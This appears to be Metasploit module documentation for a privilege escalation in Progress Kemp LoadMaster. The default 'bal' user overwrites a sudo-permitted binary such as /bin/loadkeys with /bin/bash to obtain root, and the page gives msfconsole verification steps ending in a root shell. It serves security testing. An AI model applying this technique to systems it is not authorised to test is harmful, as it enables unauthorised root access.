## Vulnerable Application
Progress Kemp LoadMaster up to at least 7.2.59.2.22338.  The vendor is aware of this "feature," but
has chosen not to change the behavior.  It was originally paired with CVE-2024-1212, but as this
privilege escalation was not patched when CVE-2024-1212 was, we split it into its own module.
This exploit/feature allows the default `bal` user to run several binaries with the `sudo` prefix
that will elevate without prompting for a password.  As the configuration is based on filename and
the `bal` user has write permissions to these files, the `bal` user can simply write over the existing
binary with one of their choosing, then prefix it with `sudo` and launch the binary with `root`
privileges.
This module defaults to overwrite `/bin/loadkeys` with `/bin/bash`, though other binaries would work,
too.

A trial VM which the exploit should work against out of the box can be downloaded from:
https://sso.kemptechnologies.com/register/kemp/vlm

The AWS marketplace also has free trials which can be used. These require the "session management" to be enabled in order for the exploit to work. Since by default the admin WUI is behind basic auth.

Because this is an appliance, there are limited commands available for command-based payloads.

## Verification Steps
1. Install the application
1. Start msfconsole
1. Gain a session on a Progress Kemp Loadmaster target as the `bal` user
1. Do: `use exploits/linux/local/progress_kemp_loadmaster_sudo_privesc_2024`
1. Do: `set SESSION <session>`
1. Do: `set LHOST <your host IP>`
1. Do: `run`
1. You should get a shell as the `root` user.
